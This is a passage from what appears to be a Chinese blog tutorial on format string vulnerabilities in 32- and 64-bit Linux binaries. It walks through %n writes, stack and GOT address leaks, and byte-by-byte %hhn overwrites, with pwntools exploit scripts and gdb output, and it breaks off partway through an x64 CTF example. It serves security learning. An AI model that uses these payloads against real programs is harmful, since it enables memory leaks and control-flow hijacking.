class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>  <span class="hljs-type">int</span> num=<span class="hljs-number">66666666</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Before: num = %d\n&quot;</span>, num);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d%n\n&quot;</span>, num, &amp;num);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After: num = %d\n&quot;</span>, num);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以发现我们用%n成功修改了num的值:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">bingtangguan<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~/Desktop/format</span><span class="hljs-variable">$ </span>./format2<br><span class="hljs-symbol">Before:</span> num = <span class="hljs-number">66666666</span><br><span class="hljs-number">66666666</span><br><span class="hljs-symbol">After:</span> num = <span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>现在我们已经知道可以用构造的格式化字符串去访问栈内的数据，并且可以利用%n向内存中写入值，那我们是不是可以修改某一个函数的返回地址从而控制程序执行流程呢，到了这一步细心的同学可能已经发现了，%n的作用只是将前面打印的字符串长度写入到内存中，而我们想要写入的是一个地址，而且这个地址是很大的。这时候我们就需要用到printf()函数的第三个特性来配合完成地址的写入。</p><h2 id="特性三-自定义打印字符串宽度"><a href="#特性三-自定义打印字符串宽度" class="headerlink" title="特性三:自定义打印字符串宽度"></a>特性三:自定义打印字符串宽度</h2><p>我们在上面的基础部分已经有提到关于打印字符串宽度的问题，在格式符中间加上一个十进制整数来表示输出的最少位数，若实际位数多于定义的宽度，则按实际位数输出，若实际位数少于定义的宽度则补以空格或0。我们把上一段代码做一下修改并看一下效果:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> num=<span class="hljs-number">66666666</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Before: num = %d\n&quot;</span>, num);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.100d%n\n&quot;</span>, num, &amp;num);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After: num = %d\n&quot;</span>, num);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到我们的num值被改为了100</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">bingtangguan<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~/Desktop/format</span><span class="hljs-variable">$ </span>./format2<br><span class="hljs-symbol">Before:</span> num = <span class="hljs-number">66666666</span><br><span class="hljs-number">00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="hljs-number">66666666</span><br><span class="hljs-symbol">After:</span> num = <span class="hljs-number">100</span><br></code></pre></td></tr></table></figure><p>比如说我们要把0x8048000这个地址写入内存，我们要做的就是把该地址对应的10进制134512640作为格式符控制宽度即可:</p><h2 id="格式化字符串漏洞利用"><a href="#格式化字符串漏洞利用" class="headerlink" title="格式化字符串漏洞利用"></a>格式化字符串漏洞利用</h2><h3 id="程序崩溃"><a href="#程序崩溃" class="headerlink" title="程序崩溃"></a>程序崩溃</h3><p>拿到一个程序之后可以通过输入若干个%s来进行判断是否存在格式化字符串漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">%s%s%s%s%s%s%s%s%s%s%s%s%s%s<br></code></pre></td></tr></table></figure><p>前面讲过没有参数的时候printf函数依然还可以输出格式化字符串对应的地址中的内容，所以如果存在格式化字符串漏洞，在输入一长串%s之后，printf会将%s作为格式化字符串，将对应地址中的内容以字符串的形式输出出来。但是栈上不可能每个值都对应了合法地址，所以数字对应的内容可能不存在，这个时候就会使程序崩溃。<br>在Linux中，存取无效的指针会引起进程受到SIGSEGV信号，从而使程序非正常终止并产生核心转储</p><h3 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h3><h4 id="获取栈变量数值"><a href="#获取栈变量数值" class="headerlink" title="获取栈变量数值"></a>获取栈变量数值</h4><p>以这个程序为例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>];<br>  <span class="hljs-type">int</span> a = <span class="hljs-number">1</span>, b = <span class="hljs-number">0x22222222</span>, c = <span class="hljs-number">-1</span>;<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s);<br>  <span class="hljs-built_in">printf</span>(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译后，用gdb动态调试，并在printf处下断点，之后运行，我们输入<code>%p%p%p</code>,回车</p><p>之后程序就停在了第一个<code>printf</code>处，这个<code>printf</code>有格式化字符串，我们来看它的栈</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span>:<span class="hljs-number">0000</span>│ esp <span class="hljs-number">0</span>xffffd02c —▸ <span class="hljs-number">0</span>x80491ea (main+<span class="hljs-number">100</span>) ◂— add esp, <span class="hljs-number">0</span>x20<br><span class="hljs-attribute">01</span>:<span class="hljs-number">0004</span>│-<span class="hljs-number">098</span> <span class="hljs-number">0</span>xffffd030 —▸ <span class="hljs-number">0</span>x804a00b ◂— &#x27;%<span class="hljs-number">08</span>x.%<span class="hljs-number">08</span>x.%<span class="hljs-number">08</span>x.%s\n&#x27;<br><span class="hljs-attribute">02</span>:<span class="hljs-number">0008</span>│-<span class="hljs-number">094</span> <span class="hljs-number">0</span>xffffd034 ◂— <span class="hljs-number">1</span><br><span class="hljs-attribute">03</span>:<span class="hljs-number">000</span>c│-<span class="hljs-number">090</span> <span class="hljs-number">0</span>xffffd038 ◂— <span class="hljs-number">0</span>x22222222 (&#x27;<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span>&#x27;)<br><span class="hljs-attribute">04</span>:<span class="hljs-number">0010</span>│-<span class="hljs-number">08</span>c <span class="hljs-number">0</span>xffffd03c ◂— <span class="hljs-number">0</span>xffffffff<br><span class="hljs-attribute">05</span>:<span class="hljs-number">0014</span>│-<span class="hljs-number">088</span> <span class="hljs-number">0</span>xffffd040 —▸ <span class="hljs-number">0</span>xffffd050 ◂— &#x27;%p.%p.%p&#x27;<br><span class="hljs-attribute">06</span>:<span class="hljs-number">0018</span>│-<span class="hljs-number">084</span> <span class="hljs-number">0</span>xffffd044 —▸ <span class="hljs-number">0</span>xffffd050 ◂— &#x27;%p.%p.%p&#x27;<br><span class="hljs-attribute">07</span>:<span class="hljs-number">001</span>c│-<span class="hljs-number">080</span> <span class="hljs-number">0</span>xffffd048 —▸ <span class="hljs-number">0</span>xf7fbe7b0 —▸ <span class="hljs-number">0</span>x80482c2 ◂— &#x27;GLIBC_2.<span class="hljs-number">34</span>&#x27;<br></code></pre></td></tr></table></figure><p>我们来详细解释一下：</p><ul><li><code>0xffffd02c</code>：这个地址的内存中存储了<code>printf</code>函数的返回值<code>0x80491ea</code></li><li><code>0xffffd030</code>：这个地址下存储了格式化字符串<code>%08x.%08x.%08x.%s\n</code>在栈中的位置，即<code>0x804a00b</code></li><li><code>0xffffd034</code>：这个位置存放了<code>a</code>的值<code>1</code></li><li><code>0xffffd038</code>：这个地址存放了<code>b</code>的值<code>0x22222222</code></li><li><code>0xffffd03c</code>：存了<code>c</code>的值，<code>-1</code>(以补码的形式)</li></ul><p>然后我们看第二个<code>printf</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span>:<span class="hljs-number">0000</span>│ esp <span class="hljs-number">0</span>xffffd03c —▸ <span class="hljs-number">0</span>x80491f9 (main+<span class="hljs-number">115</span>) ◂— add esp, <span class="hljs-number">0</span>x10<br><span class="hljs-attribute">01</span>:<span class="hljs-number">0004</span>│-<span class="hljs-number">088</span> <span class="hljs-number">0</span>xffffd040 —▸ <span class="hljs-number">0</span>xffffd050 ◂— &#x27;%p%p%p&#x27;<br><span class="hljs-attribute">02</span>:<span class="hljs-number">0008</span>│-<span class="hljs-number">084</span> <span class="hljs-number">0</span>xffffd044 —▸ <span class="hljs-number">0</span>xffffd050 ◂— &#x27;%p%p%p&#x27;<br><span class="hljs-attribute">03</span>:<span class="hljs-number">000</span>c│-<span class="hljs-number">080</span> <span class="hljs-number">0</span>xffffd048 —▸ <span class="hljs-number">0</span>xf7fbe7b0 —▸ <span class="hljs-number">0</span>x80482c2 ◂— &#x27;GLIBC_2.<span class="hljs-number">34</span>&#x27;<br><span class="hljs-attribute">04</span>:<span class="hljs-number">0010</span>│-<span class="hljs-number">07</span>c <span class="hljs-number">0</span>xffffd04c —▸ <span class="hljs-number">0</span>x804919d (main+<span class="hljs-number">23</span>) ◂— add ebx, <span class="hljs-number">0</span>x2e63<br><span class="hljs-attribute">05</span>:<span class="hljs-number">0014</span>│ eax <span class="hljs-number">0</span>xffffd050 ◂— &#x27;%p%p%p&#x27;<br><span class="hljs-attribute">06</span>:<span class="hljs-number">0018</span>│-<span class="hljs-number">074</span> <span class="hljs-number">0</span>xffffd054 ◂— <span class="hljs-number">0</span>x7025 /* &#x27;%p&#x27; */<br><span class="hljs-attribute">07</span>:<span class="hljs-number">001</span>c│-<span class="hljs-number">070</span> <span class="hljs-number">0</span>xffffd058 —▸ <span class="hljs-number">0</span>xf7ffda40 ◂— <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>由于第二次<code>printf</code>没有给参数，所以触发了格式化字符串漏洞，第一个<code>%p</code>解析了出了<code>0xffffd044</code>中的内容，<code>0xffffd050</code>，第二个解析出了<code>0xf7fbe7b0</code>，第三个解析了<code>0x804919d</code>所以打印出了<code>0xffffd050 0xf7fbe7b0 0x804919d</code>。当然也可以使用其他的占位符来达到其他的效果</p><h4 id="获取栈变量对应字符串"><a href="#获取栈变量对应字符串" class="headerlink" title="获取栈变量对应字符串"></a>获取栈变量对应字符串</h4><p>将<code>%p</code>改成<code>%s</code>，程序会以字符串的形式输出栈中内容。</p><h4 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h4><p>有时我们需要泄露某个libc函数的got表内容，从而的到其地址，进而获取libc版本以及其他函数的地址，这时候能够完全控制泄露某个指定地址的内存就很重要了。一般来说在格式化字符漏洞中，我们读取的格式化字符串都在栈上。也就是说在调用输出函数的时候，其实第一个参数的值其实就是该格式化字符串的地址。</p><p>由于我们可以控制格式化字符串，如果我们知道格式化字符串在输出函数调用时是第几个参数，这里假设改格式化字符串相对函数调用为第K个参数。那么就可以通过如下 的方式来获取某个指定地址addr的内容</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">addr<span class="hljs-built_in">%k</span><span class="hljs-built_in">$s</span><br></code></pre></td></tr></table></figure><p>下面就是如何确定该格式化字符串为第几个参数的问题了，我们可以通过如下方式确定</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">AAAA<span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span>.......<br></code></pre></td></tr></table></figure><p>还是用上面的程序，试着运行一下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">AAAA</span>-<span class="hljs-number">0</span>xffdb1e20-<span class="hljs-number">0</span>xec2bd7b0-<span class="hljs-number">0</span>x804919d-<span class="hljs-number">0</span>x41414141-<span class="hljs-number">0</span>x2d70252d-<span class="hljs-number">0</span>x252d7025-<span class="hljs-number">0</span>x70252d70-<span class="hljs-number">0</span>x2d70252d-<span class="hljs-number">0</span>x252d7025-<span class="hljs-number">0</span>x70252d70-<span class="hljs-number">0</span>x2d70252d-<span class="hljs-number">0</span>x252d7025-<span class="hljs-number">0</span>x70252d70-<span class="hljs-number">0</span>x2d70252d-<span class="hljs-number">0</span>x252d7025-<br></code></pre></td></tr></table></figure><p>我们主要注意<code>0x4141414</code>是相对于AAAA第几个出现的，这里是第4个，那么，我们就可以用<code>AAAA%4$p</code>来直接输出<code>0x41414141</code>。综上所述，如果我们如果将AAAA替换成某个函数的got地址，那么程序就会打印出这个函数的真实地址。我们拿scanf函数举例，获取函数got地址就交给我们的，例如如下这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh = process(<span class="hljs-string">&#x27;./leakmemory&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./leakmemory&#x27;</span>)<br>__isoc99_scanf_got = elf.got[<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>] <span class="hljs-comment">#获取scanf函数的got地址</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(__isoc99_scanf_got)<br>payload = p32(__isoc99_scanf_got) + <span class="hljs-string">&#x27;%4$s&#x27;</span> <span class="hljs-comment">#将AAAA%4$p中的A替换成scanf函数的got地址</span><br>sh.sendline(payload)<br>sh.recvuntil(<span class="hljs-string">&#x27;%4$s\n&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(u32(sh.recv()[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]))<br>sh.interactive()<br></code></pre></td></tr></table></figure><p>那么，我们为什么要确定格式化字符是printf的第几个参数呢？其实很简单：格式化字符串存在栈帧内，当printf函数需要依据格式化字符串来进行输出的时候，printf函数先会根据在栈顶附近存放的格式化字符串地址去找格式化字符串，比如-098 0xffffd030 —▸ 0x804a00b ◂— ‘%08x.%08x.%08x.%s\n’，其中0xffffd030是栈顶附近某个内存的地址，其中存放了储存了格式化字符串的内存的地址，就是0x804a00b。同时，存放格式化字符串的内存地址处于高地址（比较靠近栈底），所以，在printf函数依据格式化字符串在栈帧内从低到高输出栈内数据时，如果该程序存在格式化字符串漏洞，那么printf就会输出储存在栈帧内的格式化字符串。</p><h3 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h3><p>利用占位符<code>%n</code>，我们可以实现修改栈上的值。<code>%n</code>的用法如下</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[覆盖的地址]</span> %<span class="hljs-selector-attr">[偏移]</span>n<br></code></pre></td></tr></table></figure><p>而覆盖的内容，就是上一次输出的长度，比如程序上一次输出的内容大小是4个字节，那么<code>%n</code>会向这个地址中写入’4’</p><h4 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h4><h5 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h5><p>这是一个exp，下面要用到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh = process(<span class="hljs-string">&#x27;./overwrite&#x27;</span>)<br>c_addr = <span class="hljs-built_in">int</span>(sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>) <span class="hljs-comment">#获取c变量的地址</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(c_addr)<br>payload = p32(c_addr) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">12</span> + <span class="hljs-string">&#x27;%6$n&#x27;</span> <span class="hljs-comment">#构建payload</span><br>sh.sendline(payload)<br><span class="hljs-built_in">print</span> sh.recv()<br>sh.interactive()<br></code></pre></td></tr></table></figure><p>什么是小数字，怎么个小法呢？其实是小于极其字长，我们知道，<code>%n</code>会根据上一次输出的字节数存入对应地址当中，但是在实际的做题中，我们一般会在<code>%kn</code>之前通过p32小端序转化地址，一个地址，比如<code>0xdeadbeef</code>，本身长一字节，但是经过p32转化后便会变成4字节，所以说，利用这种方法写入内存的额数字最小就是4，如果需要比4小的数字，例如2，就需要如下的办法。</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&#x27;aa%knaa&#x27;</span> + <span class="hljs-function"><span class="hljs-title">p32</span>(<span class="hljs-variable">addr</span>)</span><br></code></pre></td></tr></table></figure><p>通过将p32放到<code>%n</code>后来解决，但是这样写还是不太对，真正正确的是如下的写法：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&#x27;aa%k&#x27;</span> + <span class="hljs-string">&#x27;$naa&#x27;</span> + <span class="hljs-function"><span class="hljs-title">p32</span>(<span class="hljs-variable">addr</span>)</span><br></code></pre></td></tr></table></figure><p>我们通过吧前面的字符串拆分成两个部分，每部分4字节（一共4个字符，一个字符占1字节），因为格式化字符串是第6个参数，所以<code>aa%k</code>是第六个，<code>$naa</code>是第7个， <code>p32(a_addr)</code>是第8个，所以这里的k需要改成8，这样，<code>%n</code>会将<code>aa</code>这两个字符的字符数写在第8个参数，即变量a的地址中。</p><h5 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h5><p>有时候，我们需要在一个地址中来存放另一个地址，地址一般是0x12345678这种格式的，换算成十进制化，就是305419896个字节，这个数字就非常大了，大概是291.27MB，可能栈都没这个字符串大。</p><p>但是，我们可以换个思路，我么一定要一次性注入吗？要知道，地址是16进制数，大小一般为4字节，而在32和64位系统中，数据一般按照小端储存，就是高位数字放在低地址，低位数字放在高地址，比如说0x456789AB，他在内存中的样子其实是这样的:</p><table><thead><tr><th>高地址</th><th>0xAB</th><th>0x89</th><th>0x67</th><th>0x45</th><th>低地址</th></tr></thead></table><p>综上所述，我们其实可以一字节，一字节地填充。</p><p>要使用这种方法，我们需要知道格式化字符串里面的两个标识符，<code>h</code>和<code>hh</code>，简单来说，如果我们使用了</p><p><code>h</code>标志，那么就会向变量b中一次性写两个字节，写两次填满。使用<code>hh</code>标志位会向变量b中一次性写一个字节，写四次填满。这里我们用<code>hh</code>。</p><p>所以，我们将要填充的地址，假设为<code>addr~addr+4</code>，数字是<code>0x12345678</code>。我们依然依据上面的那个exp，格式化字符串是printf的第六个参数，我们只需要把如果将addr放在格式化字符串的第6个参数位置、addr + 1放在第7个参数位置、addr + 2放在第8个参数位置、addr + 3放在第9个参数位置。再通过%6$hhn、%7$hhn、%8$hhn、%9$hhn将0x78、0x56、0x34、0x12写进去就可以了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p32(b_addr)+p32(b_addr+<span class="hljs-number">1</span>)+p32(b_addr+<span class="hljs-number">2</span>)+p32(b_addr+<span class="hljs-number">3</span>)<br>payload += <span class="hljs-string">&#x27;%104x&#x27;</span>+<span class="hljs-string">&#x27;%6$hhn&#x27;</span>+<span class="hljs-string">&#x27;%222x&#x27;</span>+<span class="hljs-string">&#x27;%7$hhn&#x27;</span>+<span class="hljs-string">&#x27;%222x&#x27;</span>+<span class="hljs-string">&#x27;%8$hhn&#x27;</span>+<span class="hljs-string">&#x27;%222x&#x27;</span>+<span class="hljs-string">&#x27;%9$hhn&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>前面的四个p32每个占4字节，一共16个字节，%104x占104个字节，所以104 + 16 &#x3D; 120 &#x3D;0x78，所以%6$hhn会将0x78写到第6个参数，即addr的位置</li><li>%222x占222个字节，再加上前面的字节数：120 + 222 &#x3D; 342 &#x3D; 0x156，因为hh是单字节，所以只取后面的0x56，所以%7$hhn会将0x56写到第7个参数，即addr+1的位置</li><li>剩下的以此类推</li></ul><p>这样，我们就完成了大数字的填充。</p><hr><h1 id="格式化漏洞（x64）"><a href="#格式化漏洞（x64）" class="headerlink" title="格式化漏洞（x64）"></a>格式化漏洞（x64）</h1><p>学习参考：<a href="https://www.yuque.com/cyberangel/rg9gdm/rvnk0g#">https://www.yuque.com/cyberangel/rg9gdm/rvnk0g#</a></p><p>这个文章中有下面要用的示例，但是在实操前，需要在示例的同目录下创建一个flag.txt文件，并在文件中填充一点内容，比如<code>flag&#123;th1s_is_@_fl4g&#125;</code></p><h2 id="64与32的区别"><a href="#64与32的区别" class="headerlink" title="64与32的区别"></a>64与32的区别</h2><p>64位格式化字符串和32位的很相似，做题的步骤也相同，唯一不同的是64位程序对函数参数存储的方式和32位的不同。64为程序会优先将函数的前6个参数放置在寄存器中，超过6个的再存放在栈上，而32位直接存放在栈上。</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>先查一下保护， 开启了NX保护和Canary保护，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Arch:       amd64-64-little<br>RELRO:      Partial RELRO<br>Stack:      Canary found<br>NX:         NX enabled<br>PIE:        No PIE (0x400000)<br>Stripped:   No<br></code></pre></td></tr></table></figure><p>先运行一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">❯ ./goodluck<br>what<span class="hljs-string">&#x27;s the flag</span><br><span class="hljs-string">114514</span><br><span class="hljs-string">You answered:</span><br><span class="hljs-string">114514</span><br><span class="hljs-string">But that was totally wrong lol get rekt</span><br></code></pre></td></tr></table></figure><p>再看源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> v4; <span class="hljs-comment">// [rsp+3h] [rbp-3Dh]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-3Ch]</span><br>  <span class="hljs-type">int</span> j; <span class="hljs-comment">// [rsp+4h] [rbp-3Ch]</span><br>  <span class="hljs-type">char</span> *format; <span class="hljs-comment">// [rsp+8h] [rbp-38h] BYREF</span><br>  _IO_FILE *fp; <span class="hljs-comment">// [rsp+10h] [rbp-30h]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v9; <span class="hljs-comment">// [rsp+18h] [rbp-28h]</span><br>  _BYTE v10[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v11; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br><br>  v11 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  fp = fopen(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">21</span>; ++i )<br>    v10[i] = _IO_getc(fp);<br>  fclose(fp);<br>  v9 = v10;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;what&#x27;s the flag&quot;</span>);<br>  fflush(_bss_start);<br>  format = <span class="hljs-number">0LL</span>;<br>  __isoc99_scanf(<span class="hljs-string">&quot;%ms&quot;</span>, &amp;format);<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">21</span>; ++j )<br>  &#123;<br>    v4 = format[j];<br>    <span class="hljs-keyword">if</span> ( !v4 || v10[j] != v4 )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You answered:&quot;</span>);<br>      <span class="hljs-built_in">printf</span>(format);&lt;--<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nBut that was totally wrong lol get rekt&quot;</span>);<br>      fflush(_bss_start);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;That&#x27;s right, the flag is %s\n&quot;</span>, v9);<br>  fflush(_bss_start);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以看到，再<code>puts(&quot;You answered:&quot;);</code>语句下面的<code>printf(format);</code>语句没有格式化字符串，存在格式化字符串漏洞。</p><p>接下来我们用gdb动调。</p><ol><li><p>首先，我们先对<code>printf</code>函数下断点</p></li><li><p>然后运行一下</p></li><li><p>程序终端在<code>printf</code>处，我们知道，64位的传参顺序先是6个寄存器，然后才是栈。</p></li><li><p>我们先看一眼寄存器（箭头是我自己加的，gdb没有）</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-built_in">RAX</span>  <span class="hljs-number">0</span><br><span class="hljs-built_in">RBX</span>  <span class="hljs-number">0</span><br>--&gt; <span class="hljs-built_in">RCX</span>  <span class="hljs-number">0x7ffff7d14887</span> (write+<span class="hljs-number">23</span>) ◂— <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rax</span>, -<span class="hljs-number">0x1000</span> /* <span class="hljs-string">&#x27;H=&#x27;</span> */<br>--&gt; <span class="hljs-built_in">RDX</span>  <span class="hljs-number">1</span><br>--&gt; <span class="hljs-built_in">RDI</span>  <span class="hljs-number">0x602ca0</span> ◂— <span class="hljs-number">0x343135343131</span> /* <span class="hljs-string">&#x27;114514&#x27;</span> */<br>--&gt; <span 